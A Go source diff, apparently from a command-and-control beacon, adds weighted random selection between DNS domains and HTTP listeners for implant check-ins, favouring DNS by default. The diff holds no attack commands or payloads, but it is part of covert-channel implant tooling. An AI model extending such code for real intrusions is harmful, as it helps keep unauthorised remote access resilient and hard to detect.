@@ -17,6 +17,7 @@ package main
 import (
 	"encoding/json"
 	"fmt"
+	"math/rand"
 	"strings"
 	"sync"
 	"time"
@@ -61,6 +62,15 @@ type transportManager struct {
 	// lastErr records why HTTP is currently considered unhealthy, for the
 	// task/result path to include in the fallback decision.
 	lastErr error
+
+	// dnsEndpoints is how many DNS endpoints (configured domains) a dual-mode
+	// check-in may target. The manager does not send DNS itself; it only needs
+	// the count to weigh the class against the HTTP listeners.
+	dnsEndpoints int
+
+	// dnsWeight and httpWeight bias the dual-mode class choice for check-ins.
+	dnsWeight  int
+	httpWeight int
 }
 
 // newTransportManager resolves configuration into a live transport manager.
@@ -75,6 +85,9 @@ func newTransportManager(cfg *Config, aesKey []byte) *transportManager {
 		fallbackAfter: cfg.HTTPFallbackAfterFailures,
 		backoff:       time.Duration(cfg.HTTPRetryBackoffSecs) * time.Second,
 		c2Key:         append([]byte(nil), aesKey...),
+		dnsEndpoints:  len(cfg.GetDomains()),
+		dnsWeight:     cfg.CheckinDNSWeight,
+		httpWeight:    cfg.CheckinHTTPWeight,
 	}
 
 	if manager.fallbackAfter <= 0 {
@@ -141,8 +154,71 @@ func (m *transportManager) ShouldUseHTTP() bool {
 	}
 }
 
-// Send delivers a protocol message over HTTP, trying each listener in order.
+// SelectEndpoint chooses the single endpoint the next check-in is sent to, in
+// dual mode, over the DNS domains and HTTP listeners together. The transport
+// class is chosen by the configured weights (default 2:1 DNS:HTTP) and a
+// concrete endpoint is picked uniformly inside that class, so a dual beacon
+// spreads check-ins across every live domain and listener. In a single-class
+// mode (dns/http) the class is forced, and an empty class is skipped.
 //
+// It returns ("dns", i) or ("http", i) where i is an index into the configured
+// DNS domains or the live HTTP transports respectively.
+func (m *transportManager) SelectEndpoint() (string, int) {
+	m.mu.RLock()
+	defer m.mu.RUnlock()
+
+	dnsN := m.dnsEndpoints
+	httpN := len(m.transports)
+
+	hasDNS := dnsN > 0
+	hasHTTP := httpN > 0
+
+	switch m.mode {
+	case transportDNS:
+		if hasDNS {
+			return "dns", rand.Intn(dnsN)
+		}
+		return "dns", 0
+	case transportHTTP:
+		if hasHTTP {
+			return "http", rand.Intn(httpN)
+		}
+		return "http", 0
+	}
+
+	// Dual mode: weigh the two classes against what is actually live.
+	switch {
+	case hasDNS && !hasHTTP:
+		return "dns", rand.Intn(dnsN)
+	case hasHTTP && !hasDNS:
+		return "http", rand.Intn(httpN)
+	case !hasDNS && !hasHTTP:
+		return "dns", 0
+	}
+
+	dw, hw := m.dnsWeight, m.httpWeight
+	if dw <= 0 && hw <= 0 {
+		dw, hw = 2, 1 // default: favour DNS for check-ins
+	}
+	if dw < 0 {
+		dw = 0
+	}
+	if hw < 0 {
+		hw = 0
+	}
+	if dw == 0 {
+		return "http", rand.Intn(httpN)
+	}
+	if hw == 0 {
+		return "dns", rand.Intn(dnsN)
+	}
+	if rand.Intn(dw+hw) < dw {
+		return "dns", rand.Intn(dnsN)
+	}
+	return "http", rand.Intn(httpN)
+}
+
+// Send delivers a protocol message over HTTP, trying each listener in order.
 // Health is recorded here rather than by the caller so every HTTP exchange
 // contributes to the fallback decision, including registrations and chunk
 // fetches.
